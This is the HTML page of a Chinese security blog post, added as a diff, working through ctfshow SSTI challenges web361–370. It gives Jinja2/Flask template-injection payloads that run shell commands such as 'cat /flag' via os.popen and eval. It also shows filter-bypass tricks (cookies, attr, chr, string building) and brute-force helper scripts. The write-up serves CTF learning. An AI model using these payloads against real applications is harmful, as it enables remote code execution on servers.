@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>SSTI注入(ctfshow) | Secfeng</title>
+  <meta name="keywords" content=" ssti ">
+  <meta name="description" content="SSTI注入(ctfshow) | Secfeng">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:site_name" content="Secfeng">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-05T11:53:12.000Z">
+<meta property="article:modified_time" content="2023-03-28T14:09:40.008Z">
+<meta property="article:author" content="Secfeng">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Secfeng</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/secfeng"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(16)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="16">
+<input type="hidden" id="yelog_site_word_count" value="38.2k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>buuctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>laravel</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>rce</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssti</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>yii</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/23/ssrf(ctfshow)/"
+           data-tag="ssrf"
+           data-author="" >
+            <span class="post-title" title="ssrf(ctfshow)">ssrf(ctfshow)</span>
+            <span class="post-date" title="2023-08-23 09:32:37">2023/08/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/16/xss(ctfshow)/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xss(ctfshow)">xss(ctfshow)</span>
+            <span class="post-date" title="2023-08-16 09:00:57">2023/08/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/03/buuctf/"
+           data-tag="buuctf"
+           data-author="" >
+            <span class="post-title" title="buuctf">buuctf</span>
+            <span class="post-date" title="2023-08-03 15:39:34">2023/08/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI模板注入">SSTI模板注入</span>
+            <span class="post-date" title="2023-07-25 16:51:43">2023/07/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI注入(ctfshow)">SSTI注入(ctfshow)</span>
+            <span class="post-date" title="2023-07-25 16:30:32">2023/07/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="laravel"
+           data-author="" >
+            <span class="post-title" title="laravel5.7反序列化漏洞复现">laravel5.7反序列化漏洞复现</span>
+            <span class="post-date" title="2023-05-30 16:31:25">2023/05/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="yii"
+           data-author="" >
+            <span class="post-title" title="yii2框架反序列化漏洞复现">yii2框架反序列化漏洞复现</span>
+            <span class="post-date" title="2023-05-29 16:22:42">2023/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化">php反序列化</span>
+            <span class="post-date" title="2023-05-27 20:16:39">2023/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化(ctfshow)">php反序列化(ctfshow)</span>
+            <span class="post-date" title="2023-05-09 20:42:55">2023/05/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含(ctfshow)">文件包含(ctfshow)</span>
+            <span class="post-date" title="2023-04-25 10:39:55">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传(upload-labs)">文件上传(upload-labs)</span>
+            <span class="post-date" title="2023-04-19 14:08:07">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"
+           data-tag="linux"
+           data-author="" >
+            <span class="post-title" title="linux学习">linux学习</span>
+            <span class="post-date" title="2023-04-14 22:24:49">2023/04/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="命令执行(ctfshow)">命令执行(ctfshow)</span>
+            <span class="post-date" title="2023-04-09 19:52:07">2023/04/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php伪协议">php伪协议</span>
+            <span class="post-date" title="2023-04-04 22:21:18">2023/04/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php特性(ctfshow)">php特性(ctfshow)</span>
+            <span class="post-date" title="2023-04-03 15:56:51">2023/04/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/03/28/xss/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xss">xss</span>
+            <span class="post-date" title="2023-03-28 20:37:01">2023/03/28</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-SSTI注入(ctfshow)" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">SSTI注入(ctfshow)</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">ssti</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-08-03 16:00:30'>2023-07-25 16:30</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:1.9k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web361"><span class="toc-text">web361</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web362"><span class="toc-text">web362</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web363"><span class="toc-text">web363</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web364"><span class="toc-text">web364</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web365"><span class="toc-text">web365</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web366"><span class="toc-text">web366</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web367"><span class="toc-text">web367</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web368"><span class="toc-text">web368</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web369"><span class="toc-text">web369</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web370"><span class="toc-text">web370</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web371-372"><span class="toc-text">**web371~372</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><p>payload（调用了“os_wrap_close”）:</p>
+<pre><code>?name=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()&#125;&#125;
+</code></pre>
+<p>or</p>
+<pre><code>?name=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125; //使用内建名称空间
+</code></pre>
+<h3 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h3><p>这关好像是频闭了父类下面的所有子类</p>
+<p>payload</p>
+<pre><code>?name=&#123;&#123;config.__class__.__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;
+</code></pre>
+<p>or</p>
+<pre><code>?name=&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat /flag').read()&#125;&#125;
+</code></pre>
+<p>or</p>
+<pre><code>?name=&#123;&#123;x.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;
+//这里的x任意26个英文字母的任意组合都可以
+</code></pre>
+<h3 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h3><p>这关过滤了单双引号</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a></p>
+<p>我们可以使用request.args来绕过此处引号的过滤。</p>
+<p>request.args是flask中一个存储着请求参数以及其值的字典</p>
+<pre><code>?name=&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a][request.args.b](request.args.c)&#125;&#125;&amp;a=__builtins__&amp;b=eval&amp;c=__import__(&#39;os&#39;).popen(&quot;ls&quot;).read()
+</code></pre>
+<p>也可以考虑字符串拼接，这里用config拿到字符串，比较麻烦就不全演示了</p>
+<pre><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;
+</code></pre>
+<p>相当于?name&#x3D;</p>
+<h3 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h3><p>这关过滤了引号和args，用request.from提交发现不允许，但可以用cookies</p>
+<pre><code>?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;
+Cookie: a=os;b=popen;c=ls
+</code></pre>
+<p>还可以用chr()函数绕过</p>
+<p><strong>中括号实际上影响我们的只有从数组中取值，例如__bases__()[1]，而后续的中括号实际是不必要的，globals[“os”]可以替换为globals.os</strong></p>
+<p>所以首先fuzz一下chr()函数在哪：</p>
+<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;
+</code></pre>
+<img src="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/163654.png" class="">
+
+<p>可以看到爆出了很多，随便选一个</p>
+<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[227].__init__.__globals__.__builtins__.chr&#125;&#125;
+</code></pre>
+<p>接着尝试使用chr尝试绕过后续所有的引号：</p>
+<pre><code>&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[227].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()&#125;&#125;
+</code></pre>
+<h3 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h3><p>过滤了中括号，但过滤了中括号实际上影响我们的只有从数组中取值，而从数组中取值可以使用pop&#x2F;<strong>getitem</strong>等数组自带方法。不过还是建议用<strong>getitem</strong>，因为pop会破坏数组的结构。</p>
+<p>a[0]与a.<strong>getitem</strong>(0)的效果是一样的，所以上述payload可以用此来绕过：</p>
+<pre><code>?name=&#123;&#123;&#123;&#125;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.a).read()&#125;&#125;
+</code></pre>
+<p>这里也尝试用一下字符串拼接，写个python脚本跑出来：</p>
+<pre><code>import requests
+url=&quot;http://24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080/?name=&#123;&#123;config.__str__().__getitem__(%d)&#125;&#125;&quot;
+payload=&quot;cat /flag&quot;
+result=&quot;&quot;
+for j in payload:
+    for i in range(0,1000):
+        r=requests.get(url=url%(i))
+        location=r.text.find(&quot;&lt;h3&gt;&quot;)
+        word=r.text[location+4:location+5]
+        if word==j:
+            print(&quot;config.__str__().__getitem__(%d)  ==  %s&quot;%(i,j))
+            result+=&quot;config.__str__().__getitem__(%d)~&quot;%(i)
+            break
+print(result[:len(result)-1])
+</code></pre>
+<pre><code>?name=&#123;&#123;url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)
+).read()&#125;&#125;
+</code></pre>
+<p>注：<code>__getitem__()</code>也可以用<code>get()</code>来代替</p>
+<h3 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h3><p>在之前的基础上又ban了<code>_</code>,用url_for.(request.cookies.a)的话会500，这关就用flask自带的过滤器attr</p>
+<p>参考<a target="_blank" rel="noopener" href="https://docs.jinkan.org/docs/jinja2/templates.html#id36">https://docs.jinkan.org/docs/jinja2/templates.html#id36</a></p>
+<p>例如foo|attr(“bar”)的意思就是foo[“bar”]</p>
+<p>payload</p>
+<pre><code>?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)&#125;&#125;
+
+Cookie传参：
+x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#39;os&#39;).popen(&#39;cat /f*&#39;).read()
+</code></pre>
+<p>or</p>
+<pre><code>?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;
+传参：a=__globals__;b=cat /f*
+</code></pre>
+<h3 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h3><p>过滤了os</p>
+<p>payload</p>
+<pre><code>?name=&#123;&#123;(lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read()&#125;&#125;
+a=__globals__;b=__getitem__;c=os;d=cat /f*
+</code></pre>
+<h3 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h3><pre><code>ban了&#123;\&#123;，就要想办法拿&#123;% %&#125;来绕过。把上一题的改一下就能直接用了：
+</code></pre>
+<pre><code>?name=&#123;%print((lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read())%&#125;
+a=__globals__;b=__getitem__;c=os;d=cat /f*
+</code></pre>
+<h3 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h3><p>ban了request，就想办法自己凑字符了，这里拿config来凑。但是一个问题是_被ban了，所以__str__()用不了，这里拿string过滤器来得到config的字符串：config|string，但是获得字符串后本来应该用中括号或者__getitem__()，但是问题是_被ban了，所以获取字符串中的某个字符比较困难，这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层.lower()方法，方便跑更多字符，写个脚本：</p>
+<pre><code>import requests
+url=&quot;http://8db9791d-549f-4151-a095-6bfbce54ba2b.challenge.ctf.show/?name=&#123;&#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;
+payload=&quot;cat /flag&quot;
+raws=&quot;&quot;
+for i in payload:
+    for j in range(0,1000):
+        result=requests.get(url=url.format(j))
+        location=result.text.find(&quot;&lt;h3&gt;&quot;)
+        ak=result.text[location+4:location+5]
+        if(ak==i):
+            print(&quot;(config|string|list).pop(&#123;&#125;).lower==&#123;&#125;&quot;.format(j,i))
+            raws+=&quot;(config|string|list).pop(&#123;&#125;).lower()~&quot;.format(j)
+            break
+print(raws)
+</code></pre>
+<p>最终payload</p>
+<pre><code>?name=&#123;% print ((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()
+).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read()) %&#125;
+</code></pre>
+<p>还有一种yu师傅的姿势</p>
+<pre><code>http://de1d82f0-b40d-430f-9cb5-ce2435f44306.chall.ctf.show:8080/?name=
+&#123;% set a=(()|select|string|list).pop(24) %&#125;
+&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;
+&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;
+&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;
+&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;
+&#123;% set chr=a.chr %&#125;
+&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;
+</code></pre>
+<p>这是新的拼接字符的方式，例如:</p>
+<pre><code>&#123;% set a=dict(o=oo,s=ss)|join %&#125;
+</code></pre>
+<p>这样得到的a就是把这个字典的键名拼接后的值，即os</p>
+<h3 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h3><p>ban了数字，可以把一些东西转string再转list，然后用index，然后基本上所有数字都可以拿到</p>
+<pre><code>&#123;% set o=(dict(o=z)|join) %&#125;
+&#123;% set n=dict(n=z)|join %&#125;
+&#123;% set f=dict(f=z)|join %&#125;
+&#123;% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %&#125;
+&#123;% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %&#125;
+&#123;% set qi=(config|string|list).index(n)%2B(config|string|list).index(f)%&#125;
+&#123;% set xiegang=(config|string|list).pop(-liushisi) %&#125;
+&#123;% set gang=(()|select|string|list).pop(ershisi) %&#125;
+&#123;% set kongge=(config|string|list).pop(qi)%&#125;
+&#123;% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %&#125;
+&#123;% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %&#125;
+&#123;% set gangfulaige=(dict(cat=d)|join,kongge,xiegang,dict(flag=z)|join)|join %&#125;
+&#123;% set ha=dict(o=x,s=k)|join%&#125;
+&#123;% print (lipsum|attr(globals)).get(ha).popen(gangfulaige).read() %&#125;
+</code></pre>
+<p>yu师傅的姿势，可以用length很方便的得到数字：</p>
+<pre><code>&#123;% set one=(dict(c=z)|join|length) %&#125;
+&#123;% set two=(dict(cc=z)|join|length) %&#125;
+</code></pre>
+<p>还有一种用过滤器int得到数字的方式：</p>
+<pre><code>&#123;% set ten=(dict(aaaaaaaaaa=a)|join|count)%&#125;
+&#123;% set two=(dict(aa=a)|join|count)%&#125;
+&#123;% set twofour=( two~four)|int%&#125;
+&#123;% set a=(()|select|string|list).pop(twofour)%&#125;
+&#123;% set chr=a.chr%&#125;
+&#123;% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%&#125;
+</code></pre>
+<h3 id="web371-372"><a href="#web371-372" class="headerlink" title="**web371~372"></a>**web371~372</h3>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023-2026 Secfeng
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
